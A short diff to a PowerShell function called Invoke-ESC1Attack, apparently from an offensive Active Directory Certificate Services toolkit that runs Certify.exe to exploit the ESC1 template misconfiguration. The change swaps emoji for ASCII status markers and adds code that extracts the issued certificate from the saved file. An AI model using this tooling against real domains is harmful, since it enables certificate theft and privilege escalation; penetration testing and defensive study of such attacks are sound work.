@@ -309,8 +309,18 @@ function Invoke-ESC1Attack {
                 Write-Verbose "Certify.exe output: $certifyOutput"
                 
                 if ($exitCode -eq 0 -and (Test-Path -Path $certFilePath)) {
-                    Write-Host "✅ ESC1 attack successful!" -ForegroundColor Green
-                    Write-Host "📄 Certificate saved to: $certFilePath" -ForegroundColor Cyan
+                    Write-Host "[+] ESC1 attack successful!" -ForegroundColor Green
+                    Write-Host "[i] Certificate saved to: $certFilePath" -ForegroundColor Cyan
+                    
+                    # Read certificate file and find the longest line
+                    try {
+                        $certFileLines = Get-Content -Path $certFilePath
+                        $certificate = $certFileLines | Sort-Object { $_.Length } -Descending | Select-Object -First 1
+                        Write-Verbose "Certificate (longest line): $($certificate.Substring(0, [Math]::Min(50, $certificate.Length)))..."
+                    } catch {
+                        Write-Warning "Failed to read certificate from file: $($_.Exception.Message)"
+                        $certificate = $null
+                    }
                     
                     return [PSCustomObject]@{
                         Success = $true
